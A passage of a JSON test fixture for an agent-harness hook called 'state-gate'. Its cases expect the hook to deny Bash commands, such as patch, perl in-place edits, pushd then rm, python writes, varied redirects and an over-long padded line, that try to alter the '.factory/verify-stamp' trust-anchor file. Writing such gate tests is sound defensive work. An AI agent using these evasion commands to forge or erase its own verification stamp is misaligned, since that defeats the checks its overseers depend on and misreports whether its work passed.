aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa .factory/verify-stamp"
   }
  },
  "expect": "deny",
  "messageContains": [
   "[process.state]",
   "trust anchors",
   "npm run verify",
   "factory-gates.md#process.state"
  ],
  "_comment": "Fail closed: a line too long to split that names the state dir."
 },
 {
  "name": "state-gate.deny-patch",
  "hook": "state-gate",
  "ruleId": "process.state",
  "input": {
   "tool_name": "Bash",
   "tool_input": {
    "command": "patch .factory/verify-stamp /tmp/p"
   }
  },
  "expect": "deny",
  "messageContains": [
   "[process.state]",
   "trust anchors",
   "npm run verify",
   "factory-gates.md#process.state"
  ]
 },
 {
  "name": "state-gate.deny-perl-in-place",
  "hook": "state-gate",
  "ruleId": "process.state",
  "input": {
   "tool_name": "Bash",
   "tool_input": {
    "command": "perl -pi -e s/a/b/ .factory/verify-stamp"
   }
  },
  "expect": "deny",
  "messageContains": [
   "[process.state]",
   "trust anchors",
   "npm run verify",
   "factory-gates.md#process.state"
  ]
 },
 {
  "name": "state-gate.deny-pushd-then-rm",
  "hook": "state-gate",
  "ruleId": "process.state",
  "input": {
   "tool_name": "Bash",
   "tool_input": {
    "command": "pushd .factory && rm verify-stamp"
   }
  },
  "expect": "deny",
  "messageContains": [
   "[process.state]",
   "trust anchors",
   "npm run verify",
   "factory-gates.md#process.state"
  ]
 },
 {
  "name": "state-gate.deny-python-c-names-state",
  "hook": "state-gate",
  "ruleId": "process.state",
  "input": {
   "tool_name": "Bash",
   "tool_input": {
    "command": "python3 -c \"open('.factory/verify-stamp','w').write('x')\""
   }
  },
  "expect": "deny",
  "messageContains": [
   "[process.state]",
   "trust anchors",
   "npm run verify",
   "factory-gates.md#process.state"
  ]
 },
 {
  "name": "state-gate.deny-quoted-redirect-target",
  "hook": "state-gate",
  "ruleId": "process.state",
  "input": {
   "tool_name": "Bash",
   "tool_input": {
    "command": "echo x > \".factory/verify-stamp\""
   }
  },
  "expect": "deny",
  "messageContains": [
   "[process.state]",
   "trust anchors",
   "npm run verify",
   "factory-gates.md#process.state"
  ]
 },
 {
  "name": "state-gate.deny-redirect-both",
  "hook": "state-gate",
  "ruleId": "process.state",
  "input": {
   "tool_name": "Bash",
   "tool_input": {
    "command": "echo x &> .factory/verify-stamp"
   }
  },
  "expect": "deny",
  "messageContains": [
   "[process.state]",
   "trust anchors",
   "npm run verify",
   "factory-gates.md#process.state"
  ]
 },
 {
  "name": "state-gate.deny-redirect-clobber",
  "hook": "state-gate",
  "ruleId": "process.state",
  "input": {
   "tool_name": "Bash",
   "tool_input": {
    "command": "echo x >| .factory/verify-stamp"
   }
  },
  "expect": "deny",
